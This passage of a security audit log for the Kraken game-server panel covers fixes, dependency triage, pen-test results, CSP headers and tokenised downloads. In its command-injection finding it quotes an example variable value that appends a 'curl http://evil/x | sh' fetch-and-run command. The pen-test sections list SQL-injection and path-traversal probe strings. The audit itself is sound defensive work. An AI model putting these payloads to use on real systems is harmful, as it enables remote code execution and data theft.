# Security Audit — 2026-06-24

> This file is canonical. The operator-facing summary, including the hardening
> checklist for an internet-facing Panel, is at
> [krakenserver.io/wiki/security/](https://krakenserver.io/wiki/security/), and
> it quotes this document rather than restating it.

Static review of the Kraken codebase (Go panel + agent, Svelte UI) covering
authentication & credential handling, injection (SQL / command / path), transport
security, and authorization.

## Verified safe

- **Password storage** — argon2id (`internal/panel/auth/password.go`) with a
  `crypto/rand` 16-byte salt, PHC-encoded, verified with `subtle.ConstantTimeCompare`.
  Hashes are never stored in plaintext, never logged, and `User.PasswordHash` is
  `json:"-"` so it cannot serialize to clients. Login is timing-safe (dummy verify
  on unknown user) to resist user enumeration.
- **Session tokens** — 32 bytes from `crypto/rand`, opaque, URL-safe; sessions
  expire and are deleted on expiry. Stored as a **SHA-256 digest** at rest (see
  "Encryption at rest" below), so a database dump cannot be replayed as live sessions.
- **SQL** — every query in `internal/panel/store/postgres` is parameterized
  (`$1,$2,…`); no string-built SQL.
- **Path traversal** — the agent's `safePath()` (`internal/agent/docker.go`)
  cleans and prefix-checks against `/data`; `..`, absolute paths, and
  `/data/../x` escapes are all rejected post-`path.Clean`.
- **Delete shell command** — `DeletePaths` shell-quotes each (already-validated)
  path before `rm -rf`.
- **Transport** — Panel↔Agent uses mutual TLS with a pinned server name
  (`mtls.ClientTLS`); no `InsecureSkipVerify`. TLS 1.2 minimum.
- **SFTP server (2026-07-01)** — the Agent's SSH/SFTP server
  (`internal/agent/sftpserver.go`) uses **per-server credentials** (username = server
  id) and chroots each connection to that server's data dir via a rooted request
  handler: client paths are cleaned against `/` (so `..` can't climb out) then joined
  to the root — the same containment as `safePath` — and symlink creation is refused.
  Passwords are **bcrypt**-hashed by the Panel and pushed to the Agent (never plaintext);
  public keys are compared by marshaled bytes. The plaintext password is shown to the
  owner exactly once (on reset) and never stored. Credential material is stripped from
  general server API responses (`serverView`) and surfaced only via the owner-scoped
  SFTP endpoint. Host key is a persisted ed25519 key. _Operator note: expose the SFTP
  port (`:2022`) only to trusted networks / behind a firewall; it's an authenticated
  service but a new externally-reachable listener._

## Fixed this audit

### Command injection via user-editable variables (CWE-78) — HIGH

A user able to create a server and set "launch options" could inject arbitrary
shell commands. `Spec.ResolveVars` applied user overrides for user-editable
variables **without validation** (the per-variable `Rules` field was never
enforced anywhere), and the resolved values were substituted, unescaped, into the
install/startup command the agent runs via `/bin/sh -c`
(`handlers_server.go` → `spec.Render` → `docker.go` `Cmd: {script}`).

Example: a spec with `command: ./srv +map {{MAP}}` and a user override
`MAP = "de_dust2; curl http://evil/x | sh"` executes the attacker's command in
the container.

**Fix:** `Spec.ValidateVarOverrides` (`internal/shared/spec/render.go`) rejects
overrides of user-editable variables that contain shell metacharacters or control
characters; it is enforced at the input boundary in `handleCreateServer` (400 on
violation). Regression/exploit test: `internal/shared/spec/security_test.go`
(`TestVarOverrideCommandInjection`, `TestVarOverrideAllowsBenign`).

## Fixed in the follow-up pass (2026-06-25)

- **WebSocket origin** — `handlers_stream.go` no longer uses `["*"]`; it restricts
  cross-origin upgrades to `KRAKEN_ALLOWED_ORIGINS` (default localhost dev
  origins; same-origin always allowed).
- **Token out of the URL** — the stream WS now carries the session token in the
  `kraken.token` WebSocket subprotocol instead of a `?token=` query param, so it
  never lands in URLs, access logs, or browser history. (`streamToken`, and the
  frontend `useServerStream` subprotocol.) This is about the **session** token
  and remains absolute: a session credential never goes in a URL. It is not a
  blanket ban on every token — see *Tokenised file downloads (2026-09-15)*,
  where a single-use, 60-second, path-scoped grant that is not a session
  credential does ride in a URL, deliberately and with its own argument.
- **Secure-by-default agent pool** — `api.New` derives the pool from config: mTLS
  when certs are present, insecure only with a loud warning. No more
  insecure-by-default footgun (`defaultNodePool`).
- **Bootstrap admin** — no weak default; when no password is configured, `Seed`
  generates a strong random one and logs it once.
- **Per-variable `Rules`** — now enforced in `ValidateVarOverrides` (int/float/
  bool/min/max/in) alongside the shell-metachar check (`validateRules`). Tests in
  `internal/shared/spec/security_test.go`.

## Static analysis sweep (2026-06-25)

Ran `go vet`, `govulncheck`, `gosec`, and `npm audit` over the backlog work.

- **`go vet`** — clean.
- **`npm audit`** (web, prod + dev) — **0 vulnerabilities**.
- **`govulncheck`** — 2 advisories (`GO-2026-4887`, `GO-2026-4883`), both in the
  pinned `github.com/docker/docker@v27.3.1+incompatible` Docker Engine SDK used by
  the Agent. **Fixed in: N/A** (no upstream fix available) and the SDK is
  version-pinned for build compatibility. **Accepted with monitoring:** reachable
  only from the Agent (which runs on trusted nodes and must talk to the local
  Docker daemon); re-evaluate when an upstream fix ships.
- **`gosec`** — 43 findings, triaged; no exploitable issues in our code:
  - **SSRF / path-traversal in `krakenctl`** (G703/G704) — taint from `os.Args`
    (`-panel`, `-out`); these are operator-supplied CLI arguments, not untrusted
    input. Not a vulnerability.
  - **Integer-overflow conversions** (G115) — bounded domains (ports 0–65535,
    memory in MB, argon2 params). No practical overflow.
  - **File reads by variable path** (G304) — config-supplied cert paths (mtls) and
    the backup store, which is guarded by a `filepath.Dir` prefix check against the
    server's backup dir. Safe.
  - **Decompression / form size** (G110/G120) — operate on the operator's own
    server data; uploads are already bounded by `io.LimitReader(maxUploadBytes)`.
  - **Cert file perms** (G306) — public certs at `0644`, **private keys at `0600`**
    (correct); consistent with `gen-certs`.
  - **Hardened:** backup directory creation tightened `0755`→`0750`
    (`internal/agent/backupstore.go`).

## Beta hardening pass (2026-06-25)

Re-ran static analysis + a live pen test of the Panel as the codebase grew
(bind-mount file subsystem, Windows support, WS streaming).

**Static analysis** — `go vet` clean; `staticcheck` clean; `npm audit` 0 vulns;
`govulncheck` = the 2 unfixable Docker-SDK advisories (accepted, agent-only, see
above). `gosec` 65 findings triaged → no exploitable issues: file-manager paths
(G304) are guarded by `safePath`; dir/file perms (G301/G306) are intentional so
bind-mounted containers can read their data; `filepath.WalkDir` TOCTOU (G122) is
over the agent's own managed dir; integer conversions (G115) are bounded; the
`krakenctl` SSRF/traversal (G703/G704) are operator-supplied CLI args.

**Fixed this pass:**
- **Spoofable client IP (staticcheck SA1019).** Removed `chi middleware.RealIP`,
  which trusts client `X-Forwarded-For`/`X-Real-IP`; `clientIP()` now uses the
  real TCP peer so audit-log source IPs can't be forged (no trusted proxy assumed).
  _Superseded in part by the trusted-proxy model — see "Download-token hardening
  (2026-09-16)". The default is unchanged (no header believed); an operator who
  names their proxy gets the real client instead of the proxy on every row._
- **Security headers.** Added `secureHeaders` middleware → `X-Content-Type-Options:
  nosniff` + `X-Frame-Options: DENY` on all responses.
- **Download filename.** `Content-Disposition` filename is sanitized
  (`sanitizeFilename`) so a crafted name can't break the header.

**Pen test (live Panel) — all passed:**
- Unauthenticated REST + WebSocket requests → 401; garbage/expired tokens → 401.
- Login: wrong password → 401; SQL-injection-style username → 401 (no 500).
- Path traversal (`../../etc/passwd`, `/etc`) on file endpoints → rejected
  ("path escapes /data").
- Command injection via launch variables → neutralized: shell metacharacters in
  real user-editable vars are rejected, and unknown override keys are dropped by
  `ResolveVars` (never stored or substituted — verified the created server's vars).
- Agent enrollment with a bad bootstrap token → 401.
- Responses carry the new security headers.

## Encryption at rest (2026-06-26)

Every secret the Panel persists to Postgres is now protected at rest. Master key
resolution (`config.ResolveSecretsKey`): `KRAKEN_SECRETS_KEY` (base64 of 32 bytes)
if set, else an auto-generated 32-byte key persisted to the config file
(`data/panel.json`, mode `0600`, **outside** the database it protects). A startup
warning is logged when the key was auto-generated, nudging operators to set
`KRAKEN_SECRETS_KEY` for production / multi-Panel deployments.

- **User passwords** — already argon2id (irreversible); unchanged. A hash is the
  correct at-rest form, so it is not additionally encrypted.
- **Session tokens** — hashed with SHA-256; only the digest is stored
  (`store.HashToken`), lookups hash the incoming bearer. A DB dump yields no usable
  tokens. (Pre-existing plaintext sessions stop validating after upgrade — users
  simply re-login.)
- **Reversible secrets** — the Cloudflare API token, UniFi API key, the Agent-
  enrollment **CA private key**, and each node's **SFTP backup credentials and
  Steam password** (per-node config: SFTP password, SFTP private key, Steam
  password) are sealed with **AES-256-GCM** (random nonce per value) before they
  touch the DB and decrypted on read (`internal/panel/secrets`). The CA
  *certificate* is public and stored in the clear; only the key is sealed. In a
  node's `node_config.data` JSONB only the credential fields are sealed —
  non-secret fields (target, host, paths, Steam username) stay readable so
  operators can inspect on-disk config. The Steam password is injected into the
  install container's env only at deploy time (for `RequiresSteamLogin` specs);
  the one-time Steam Guard code is transient and never persisted.
- **Game-server setting values — plaintext by design (accepted 2026-07-01).** A
  server's `settings`/`vars` (e.g. a game's in-game join password like
  `SERVER_PASSWORD`) are stored in the clear in the `servers.data` JSONB. They are
  low-sensitivity *game config* — rendered verbatim into the game's own config files
  — not infrastructure credentials, and the store layer is spec-agnostic (it can't
  tell which setting keys are `password`-typed without the spec). This matches
  Pelican/Pterodactyl, which store server variables in plaintext. Reviewed and
  **accepted as low-risk**; not encrypted.
- **Transparent migration** — ciphertext carries a marker (`enc:v1:` for strings,
  `ENC1` for byte blobs); values without the marker are treated as legacy plaintext
  and re-sealed on the next write, so upgrades need no data migration step.
- **Scope** — encryption is wired into the Postgres store only; the in-memory dev
  store holds secrets in RAM (never persisted). The Postgres **DSN** itself lives in
  `data/panel.json` (`0600`), not the DB, since it bootstraps the DB connection.

Verified end-to-end against a live Postgres
(`TestPostgresEncryptionAtRest`): raw `panel_settings.data` carries `enc:v1:`
ciphertext (no plaintext token/key substrings), `cluster_ca.key_pem` is `ENC1`-
sealed, and `sessions.token` holds the SHA-256 digest — each still round-trips
correctly through the store's read path. `TestPostgresNodeConfigEncryptionAtRest`
covers the per-node backup credentials the same way (sealed secrets, plaintext
non-secret fields). Unit round-trip + legacy-passthrough + wrong-key tests in
`internal/panel/secrets`.

## Release-prep static analysis (2026-07-01)

Full sweep before the release cut: `go build`, `go vet`, `staticcheck`, `deadcode`,
`gosec`, `govulncheck`.

- **`go build` / `go vet` / `staticcheck`** — all clean, zero findings.
- **`deadcode ./cmd/...`** — clean. Removed two now-unused symbols this pass:
  `DockerRuntime.backupTarget()` (`internal/agent/docker.go`) and the `WithNodePool`
  option (`internal/panel/api/server.go`, plus its stale doc comment).
- **`govulncheck`** — **5** advisories, **all** in the pinned
  `github.com/docker/docker@v27.3.1+incompatible` Engine SDK, **all `Fixed in: N/A`**
  (grew from 2 as upstream disclosed more; no upstream fix exists for any):
  - `GO-2026-5746` — archive endpoint (`PUT /containers/{id}/archive`) executes a
    container binary on the host.
  - `GO-2026-5668`, `GO-2026-5617` — `docker cp` race conditions (symlink swap →
    arbitrary empty file / bind-mount redirection to a host path).
  - `GO-2026-4887`, `GO-2026-4883` — pre-existing Docker-SDK advisories.

  **Reachability assessed — not exploitable through Kraken's call paths.** The three
  new CVEs are all about the container **file-copy / archive** API. Kraken never calls
  `CopyToContainer` / `CopyFromContainer` / the archive endpoint — confirmed by grep;
  the only Docker file-ish call is `ContainerExecCreate` (the player-query exec), and
  **all** Kraken file operations and backups are native Go (`internal/agent/fileops.go`)
  over host **bind mounts**, never `docker cp`. `govulncheck` flags the module because
  the SDK's `init` chains touch the vulnerable package, but the vulnerable *functions*
  are not on any Kraken code path. All five are also **daemon-side** and reachable only
  from the Agent, which runs on a trusted node and must talk to its local Docker daemon.
  **Accepted with monitoring**; re-evaluate when upstream ships fixes.
- **`gosec`** — 65 MEDIUM+ findings triaged; no exploitable issue in our code (baseline
  unchanged from the beta pass, plus a newer gosec ruleset adds theoretical rules):
  - **Goroutine uses `context.Background`** (G118, ×2) — `go s.provision(...)` and
    `go d.runBackup(...)` are long-lived background jobs that **must outlive** the HTTP
    request; a request-scoped context would cancel them mid-install/backup. Intentional.
  - **`filepath.WalkDir` TOCTOU** (G122, ×2) — tar-walk over the Agent's *own* managed
    data dir during backup. Operator-owned tree; not attacker-influenced.
  - **SSRF / traversal in `krakenctl`** (G703/G704) — taint from operator-supplied CLI
    args (`-panel`, `-out`); not untrusted input.
  - **Integer conversions** (G109/G115) — bounded domains (ports, counts, sizes). The
    Palworld-REST query port now also has an explicit upper bound (`pv <= 65535`,
    `handlers_server.go`).
  - **File reads by variable path** (G304) — the file-manager paths are guarded by
    `safePath`; cert paths are config-supplied.
  - **Dir/file perms** (G301/G306) — intentional so bind-mounted containers can read
    their data and public certs; **private keys are `0600`** (verified: `agent-key.pem`,
    the EC key, and the SFTP host key are all `0600`).
- **`npm audit`** (web) — see prior passes; unchanged.

## Release-prep live pen test (2026-07-01)

Live black-box + authed test of the running Panel (`:8080`) as part of the release
cut. Battery: auth bypass, token forgery, SQLi, path traversal, command injection,
object-scope/IDOR, malformed input, security headers, WS cross-origin.

**All passed except one low-severity robustness finding (patched, below):**
- Unauthenticated REST → **401** on every protected endpoint; garbage / empty /
  wrong-scheme tokens → 401.
- Login: wrong password → 401; SQLi-style usernames (`admin' OR '1'='1`, `admin'--`,
  `'; DROP TABLE users;--`) → **401, no 500** (queries are parameterized).
- Path traversal on file endpoints (`../../../../etc/passwd`, `/etc/passwd`,
  `/data/../../../etc/passwd`, URL-encoded variants) → **rejected** by the Agent's
  `safePath` ("escapes /data"); no host file served. (The Panel surfaces the Agent's
  refusal as `502`; the traversal is blocked either way.)
- Command injection via launch variables → **not exploitable**: the bundled specs
  expose no user-editable launch `variables` (settings render into config *files*,
  never the shell command), and `ValidateVarOverrides` rejects shell metacharacters on
  any spec that would add one (unit test `TestVarOverrideCommandInjection`). Unknown
  variable keys are dropped, not substituted.
- Object-scope: a random valid-but-nonexistent server id → **404** (404-on-denial, so
  existence isn't revealed); IDOR isolation covered by `TestServerOwnershipIsolation`.
- Security headers (`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`) present.
- WebSocket upgrade with a foreign `Origin` → rejected (no 101).

### Fixed this pass

**Malformed id returned HTTP 500 (info-hygiene / robustness) — LOW.** Every `{id}`
path parameter is passed straight to Postgres, where the id columns are `uuid`. A
non-UUID id (e.g. `GET /api/v1/servers/not-a-uuid`, or a SQLi probe in the path)
made Postgres raise `22P02 invalid_text_representation`, which the store returned as a
generic error → the handler mapped it to **500** instead of 404. No data leak and auth
was still required, but a 500 on attacker-controlled input is poor hygiene and muddies
real-error monitoring.

_PoC (before):_ `curl -H "Authorization: Bearer <token>" http://localhost:8080/api/v1/servers/not-a-uuid` → `500`.

**Fix:** a `notFoundErr` helper in the Postgres store
(`internal/panel/store/postgres/postgres.go`) now treats `22P02` the same as
`pgx.ErrNoRows` — for a lookup by id, a malformed uuid is indistinguishable from a
missing row → `store.ErrNotFound` → **404**. Applied to all read and id-based
write/delete paths. Regression test: `TestPostgresMalformedIDIsNotFound`.
_After:_ same request → `404`; SQLi-in-path → `404`; no 500s in the Panel log.

## Node-local secret exposure (2026-07-31)

- **Persisted runtime specs on the Agent (`<state>/agent-specs/<serverID>.json`, mode 0600).**
  Added so a restarted Agent can re-adopt its running servers' crash watchdogs. A spec
  carries the server's environment, which for some games includes admin/RCON passwords.
  This widens nothing materially: `ApplyConfig` already writes rendered config files
  containing the same secrets into the server's data dir, and both live on a host whose
  Docker socket the Agent controls — an attacker with file access there has already won.
  The files are written 0600 (the state dir 0700) rather than inheriting the data dir's
  0755, and they are removed with the server. Encrypting them would require a node-local
  key sitting next to the ciphertext, which buys nothing; if node-local secrets are ever
  sealed, this and the rendered configs should be done together.

## Browser response headers / CSP (2026-08-03)

Prompted by walking a live internet-exposed deployment: the Panel set only
`X-Content-Type-Options` and `X-Frame-Options`, on the stated reasoning that it
"serves JSON/YAML and a metrics endpoint (no HTML)". That stopped being true when
the Panel began embedding and serving the whole web UI, which makes a
Content-Security-Policy the load-bearing header rather than an afterthought.

Added a CSP plus `Referrer-Policy: no-referrer` and a minimal `Permissions-Policy`
(`buildCSP` / `secureHeaders` in `internal/panel/api/server.go`). The policy is as
tight as the real bundle allows, and each directive is pinned to evidence:

- **`script-src 'self'`** — no `'unsafe-inline'`, no `'unsafe-eval'`. `index.html`
  carries no inline script and the built bundle contains no `eval(`.
- **`style-src 'self'` / `font-src 'self'`** — no third-party origin at all. The
  `style-src` value is notably **without** `'unsafe-inline'`, and the UI is built
  to live inside that: the design system is one served stylesheet
  (`web/src/styles/house.css`, generated from the living mock), and every
  per-element value the instruments need — `--lvl`, `--pct`, `--ox/--oy`, ray
  and packet descriptors — is written through the **CSSOM**, which CSP does not
  govern (`web/src/lib/istyle.ts`; Svelte's `style:` directive does the same).
  Literal `style="…"` attributes in markup DO need the exception and are
  therefore banned: `npm run check:csp` fails the build and CI if one appears.
  This matters because the block is **silent** — a blocked declaration simply
  never applies, so a meter renders at its default with only a console line to
  say why. Verified live under full enforcement (Panel-served bundle, not the
  dev server) across login, the pane with all instruments, and the server
  drill-in: fully styled, zero violations.
  The brand faces were on Google's CDN until they were vendored into
  `web/public/fonts` (OFL 1.1, licenses shipped alongside); the test asserts
  neither `fonts.googleapis.com` nor `fonts.gstatic.com` can return.
- **`img-src 'self' data: https:`** — deliberately permissive. Game Specs carry
  operator-supplied `icon_url` / `banner_url` pointing at arbitrary CDNs
  (Steam, Thunderstore, GitHub); tightening this silently removes game artwork.
- **`frame-ancestors 'none'`** alongside the existing `X-Frame-Options: DENY`.
- **No `upgrade-insecure-requests`.** Plain-`http://` LAN installs are a
  first-class deployment and it would break their subresource loads.

`KRAKEN_CSP` selects `enforce` (default) / `report-only` / `off`; an unrecognized
value falls back to enforcing so a typo cannot silently drop the header.
`KRAKEN_CSP_SCRIPT_SRC` and `KRAKEN_CSP_CONNECT_SRC` widen those two directives
per-deployment — a Panel behind a CDN that injects a script (Cloudflare Web
Analytics) allows that host locally rather than in the default every other
operator inherits. Covered by `internal/panel/api/security_headers_test.go`,
including assertions that `'unsafe-inline'`, `'unsafe-eval'` and
`upgrade-insecure-requests` never appear.

Not addressed here: `Strict-Transport-Security` is still left to whatever
terminates TLS (Cloudflare sets it on the reference deployment). The Panel serves
plaintext HTTP on a LAN by design, so it is the wrong layer to assert HSTS.

## Open recommendations (not yet addressed)

- **Flat Agent certificate identity.** Every Agent cert carries the same logical
  identity (`CN`/SAN `kraken-agent`), which the Panel pins for all nodes — so Agent
  certs are mutually interchangeable, and the enrollment endpoint honors CSR-supplied
  SANs. This matches the original `gen-certs` design (not a regression from the new
  bootstrap flow) and is acceptable when all nodes are equally trusted. To support
  mixed-trust nodes, bind per-node identity into the issued cert and verify it when
  the Panel dials. (Code review 2026-06-25.)
- ~~**Object-level authorization (IDOR).**~~ **Fixed 2026-07-01.** Servers now carry
  an `OwnerID` (stamped from the creating user). Every server-scoped endpoint — get,
  list, power (both `/servers/{id}/power` and the node-scoped path), delete, files,
  backups, settings, DNS, port forwards, schedules, and the console/stats WS — checks
  ownership via `authorizeServer`/`mayAccessServer` (`internal/panel/api/middleware.go`)
  after loading the server. Access is granted to the owner or to a role holding the new
  **`server.any`** permission (Owner `*` / Admin `server.*` via wildcard; Operator and
  Read-only do **not** hold it, so they are scoped to servers they created). List is
  filtered to accessible servers; denied access returns **404** (not 403) so another
  user's server isn't revealed to exist. Servers created before ownership existed
  (empty `OwnerID`) are reachable only by `server.any` holders. Regression test:
  `TestServerOwnershipIsolation` (`internal/panel/api/authz_test.go`).

## Cross-node agent authentication + dependency sweep (2026-08-27)

Full pass on a pulled `main` (0.26.0): dependency scans, static analysis, and a
focused review of the Panel↔Agent trust boundary and the enrollment/self-update
paths added since the last audit.

### Fixed this pass

**Cross-node agent impersonation → fleet-wide RCE (CWE-295 / CWE-284) — HIGH/CRITICAL.**
The Agent's direct gRPC listener (`mtls.ServerTLS`) authenticated any client cert
that merely chained to the cluster CA. But the CA is a *shared* trust anchor — it
signs the Panel's client cert **and** every Agent's server cert, and Agent certs
carry the `ClientAuth` EKU (they need it to dial the reverse tunnel). So any Agent's
own certificate authenticated as a client to every *other* Agent. An attacker who
compromised one node (or redeemed a single leaked one-time enrollment token) could
therefore drive the full `NodeService` on every node in the fleet — including
`UpdateAgent`, which overwrites the target's own binary and re-execs it: remote code
execution on the whole fleet from one foothold.

_PoC (before):_ `TestAgentRejectsPeerAgentCertificate` — an attacker-held enrolled
Agent cert calls `GetNodeInfo` on a peer Agent and succeeds; `TestAgentRejectsPeerAgentReachingUpdateRPC`
shows the same cert reaching the `UpdateAgent` (RCE) handler
(`internal/agent/crossagent_authz_test.go`). Reverting just the fix re-opens both.

**Fix:** identity-based authorization on the Agent listener. `mtls.RequirePeerCN`
(installed as `ServerTLS`'s `VerifyConnection`) enforces that the verified client
leaf's Subject `CN` equals `PanelServerName` — only the Panel may drive an Agent.
The CN is authoritative because the signer sets it (`SignAgentCSR*` hardcodes the
subject and never copies it from the CSR), so an enrollee cannot forge it. The
Agent's handshake-logging hook in `cmd/agent/main.go` now *chains* that check
instead of replacing it (a bare `return nil` there would have silently re-opened the
listener). The reverse-tunnel listener (`ServerTLSFromBytes`) is unchanged and still
accepts Agent certs — that direction is *supposed* to, and it already authorizes by
the per-node URI-SAN identity → node binding.

**Hardened (defense-in-depth):** `SignAgentCSRWithIdentity` now strips the reserved
logical names (`kraken-panel`, `kraken-ca`) from enrollee-supplied CSR SANs
(`dropReservedNames`), so a crafted CSR can never have the Panel's or CA's identity
signed into an Agent cert. Regression: `TestEnrollmentCannotMintPanelIdentity`.
Guardrail that the Panel's own cert still works: `TestAgentAcceptsPanelCertificate`.

This also resolves the standing "Flat Agent certificate identity" recommendation's
worst consequence: even though all Agent certs still share `CN=kraken-agent`, they
are no longer accepted as *clients* by peer Agents at all.

### Dependency + static-analysis sweep

- **Go toolchain → 1.26.6** (pinned via a `toolchain` directive in `go.mod`).
  `govulncheck` had flagged **8 standard-library advisories** reachable from Panel
  and Agent code paths (`GO-2026-6218/6091/6090/6089/6088/5972/5856/5026`, in
  `net/url`, `html/template`, `crypto/tls`, `net/http`, `encoding/xml`,
  `encoding/asn1`, `golang.org/x/net/idna`) — **all fixed in go1.26.6**. After the
  bump, `govulncheck` reports **only** the 2 unfixable Docker-Engine-SDK advisories
  (`GO-2026-4887`, `GO-2026-4883`, both `Fixed in: N/A`), which remain **accepted
  with monitoring**: agent-only, and the vulnerable file-copy/archive functions are
  not on any Kraken call path (all file ops + backups are native Go over bind mounts).
- **`npm audit`** (web, prod + dev) — **0 vulnerabilities**.
- **`go vet` / `staticcheck`** — clean.
- **`gosec`** — 82 MEDIUM+ findings, all in the previously-triaged baseline
  categories (G115 bounded integer conversions; G304 file reads guarded by
  `safePath`/config paths; G703/G704 operator-supplied `krakenctl` CLI args;
  G122 walks over the Agent's own managed dir; G301/G306 intentional perms with
  private keys at `0600`; G118 long-lived background goroutines). Spot-checked the
  newer rules: G705 "XSS" on the file-download handlers is a false positive — they
  send `Content-Type: application/octet-stream`/`application/zip` +
  `Content-Disposition: attachment` under the global `X-Content-Type-Options: nosniff`;
  G120 unbounded-form is bounded by `ParseMultipartForm(maxUploadBytes)` +
  `io.LimitReader`; G404 is non-crypto reconnect jitter. No exploitable issue.
- **Full `go test -race ./...`** — green.

## Dependency sweep — SSH DoS in x/crypto (2026-09-11)

Full pass on `main` at 0.41.0 (post the temp-retirement and node-`link`-metric
work). `go vet` and `staticcheck` clean; the review focused on the file-handling
surface added since the last audit — backup archive/restore (#228, #247, #252),
SMB replication (#238), node delete/re-enroll (#165), the self-update stream
(#172), and the new `link` telemetry (#256). No first-party finding: the restore
extractor (`internal/agent/restore.go`) is hardened against Zip-Slip on every
axis — per-**segment** `..` rejection, absolute/volume rejection, `filepath.IsLocal`,
an explicit prefix check on the joined destination, and `withinHostDir`, with
symlink/hardlink entries **skipped** rather than materialized.

### Fixed this pass

**SSH connection-deadlock DoS via the Agent's SFTP listener (CWE-400) — MEDIUM.**
`govulncheck` flagged two advisories in `golang.org/x/crypto/ssh`, both reachable
and both **fixed in v0.56.0**:

- **`GO-2026-6354`** (CVE-2026-78662) — a peer floods an *undecided* channel's
  incoming requests, deadlocking the whole SSH connection at the mux layer.
- **`GO-2026-6355`** — after a channel is established, a peer sends messages the
  mux buffered-and-blocked on, deadlocking the connection.

Both are reached through `SFTPServer.handleConn` → `ssh.NewServerConn`
(`internal/agent/sftpserver.go:135`) — the Agent's **inbound** SFTP listener
(`:2022`) — and, less interestingly, through the outbound SFTP backup dial
(`sftp.go` → `ssh.Dial`, remote is operator-configured). The realistic threat is
the listener: a holder of any single server's per-server SFTP credentials (or a
leaked/compromised one) can deadlock a connection handler; each runs in its own
goroutine (`go s.handleConn`), so repeated malicious connections leak
goroutines/FDs and take down the node's whole SFTP file service — a cross-tenant,
auth-gated node DoS. The port is meant to be firewalled (see the SFTP note above),
which bounds exposure but does not remove it.

_Exploitability confirmation._ These are protocol-level deadlocks **inside**
x/crypto's channel mux; the triggering sequences (requests on an unconfirmed
channel; unrecognized channel messages) cannot be emitted through x/crypto's
high-level client API, so a faithful trigger would mean porting upstream's
raw-protocol regression harness against the pinned-vulnerable version. As with the
2026-08-27 stdlib bump, exploitability was therefore confirmed by `govulncheck`'s
reachability analysis rather than a bespoke packet-flood: before the bump it
reports both advisories as **called** via `ssh.NewServerConn` on the
externally-reachable SFTP server; after the bump both are gone.

**Fix:** `golang.org/x/crypto` v0.55.0 → **v0.56.0** (`go.mod`), the version the
advisories name. No code change; the SFTP server round-trip/jail tests
(`internal/agent/sftpserver_test.go`) and `make check` stay green.

### Accepted with monitoring (no upstream fix)

`govulncheck` now reports only three `Fixed in: N/A` advisories, all reachable
only from operator-configured/trusted inputs:

- **`GO-2026-5051`** — out-of-bounds read / panic in `ReadDir` in
  `github.com/hirochachacha/go-smb2`. Reached by the Agent's SMB backup **client**
  (#238) listing a remote share; the SMB server is an operator-configured backup
  target, not untrusted input. No upstream fix. Re-evaluate when one ships (or
  wrap the client's directory reads in a panic recovery if the dependency stalls).
- **`GO-2026-4887`, `GO-2026-4883`** — `github.com/docker/docker` (now v28.5.2)
  Engine-SDK advisories, both `Fixed in: N/A`. The standing accepted class:
  agent-only, daemon-side, and the vulnerable file-copy/archive functions are not
  on any Kraken call path (all file ops + backups are native Go over bind mounts).

`npm audit` (web) unchanged — 0 vulnerabilities.

## Tokenised file downloads (2026-09-15)

The Files tab's `download` pill used to fetch a file — or a folder's zip — with
the session's Bearer header and hand the bytes to the browser as a Blob through
a throwaway anchor. That is the only shape a Bearer-authenticated client has
without a cookie, and it is the wrong one for anything large: the whole payload
sits in tab memory before the save dialog appears, with no progress, and a
multi-GB install tree exhausts the tab. The Panel already streamed; the
buffering was entirely browser-side, forced by the auth model (#304).

A download now goes through a short-lived token instead:
`POST /servers/{id}/files/download-token` (permission `server.files.read`, the
same one the raw route carries) mints one, and `GET /files/raw?token=…` or
`GET /files/download?token=…` redeems it, so a plain `<a download href>` can
carry the authorization and the browser streams to disk with its own progress
UI. The token table is `internal/panel/api/filedownloadtokens.go`; the route
logic is `handlers_filedownloadtoken.go`.

**Why a token in a URL is acceptable here.** It is not a session credential and
cannot be turned into one. Concretely, each token is:

- **Single-use.** The grant is deleted the moment it is looked up — before any
  validation and long before a byte streams — so a replayed URL finds nothing
  whether or not the first attempt succeeded.
- **60 seconds.** Expiry is checked at redemption, not merely promised at mint,
  and issuing sweeps grants that have aged out.
- **Scoped to one server and one exact path set.** The server id must match the
  one it was minted for, and the route kind must match (a raw token is not a
  zip token). The Panel canonicalises the path — Windows separators, redundant
  separators and `.`/`..` segments collapsed, an upward escape refused — and
  *pins* that spelling into the grant; a redemption naming a different path is
  refused rather than served. Downstream only ever sees the pinned path,
  because the query is rewritten from the grant rather than trusted as it
  arrived, so the token cannot be widened. The jail itself is unchanged and is
  not the Panel's: the Agent's `safePath` confines every request to the
  server's data root regardless of how it was authorized.
- **Bound to the issuing user and session, re-validated at redemption.** The
  minting user must still exist, still be enabled, still hold
  `server.files.read` and still pass the ownership scope on that server
  (`mayAccessServer`, called in `redeemDownloadToken` and again by
  `agentForServer` on the way through), **and the session that minted the token
  must still be on record** (`SessionExistsByHash`). A role revoked, an account
  deleted, a server handed to another owner, a logout or an admin-revoked
  session inside the 60-second window all take effect on the download. The
  binding is a digest, never a token: `requireAuth` puts `hex(sha256(bearer))`
  — the same value the store already keys sessions by — into the request
  context under `ctxKeySessionHash`, and the grant carries that digest. The
  Panel holds no session secret to leak, and no schema change was needed
  because sessions have been stored by digest since the encryption-at-rest
  pass.
- **Never a Bearer alternative.** With `token` present the Authorization header
  is not consulted at all, so a live session can never rescue an invalid token;
  with it absent, the routes behave exactly as they did before.
- **Never persisted and never logged.** Generated from `crypto/rand` and
  looked up by its SHA-256 digest in an in-memory table a Panel restart
  empties; the secret itself is never stored and never written to Postgres.
  The audit log records the
  mint and the redemption with the server, the user and the path *count*; the
  token itself appears in no log line, and a rejected redemption is a `Debug`
  line rather than an audit row, so an unauthenticated caller with a bad token
  cannot amplify writes into the audit table — or, at `Debug`, into the log at
  the level an operator actually reads. What that line does carry from the URL
  (the server id) is clipped to 64 characters first: it is attacker-chosen, and
  a log file is not somewhere to let a stranger write 4 KiB. The redemption row carries the
  request's **outcome** status, not an assumed 200 — a redemption the node
  could not serve is on the record as the 502 it was, rather than as a
  download that never happened. It is written from a deferred call, so a
  stream that aborts mid-way is recorded rather than unwound past, and the
  append runs on a `context.WithoutCancel` copy of the request context (with a
  deadline of its own): the rows most worth having are the ones where the
  client hung up first, and on the request context the store would drop
  exactly those.

Three things the browser-side change forced, all of which touch the
already-shipped session-authenticated routes too:

- **A failed download must not arrive as a file.** Both stream handlers used to
  set `Content-Type` and `Content-Disposition: attachment` *before* the first
  chunk came back from the Agent. `writeError` cannot unset them, so a stream
  that failed on its first `Recv` sent its JSON 502 under the attachment
  header. With a `fetch` in front that was invisible; with a real anchor
  navigation the browser saves it — a 40-byte "saves.zip" holding an error
  message, and nothing on screen to say so, because no JS is watching a
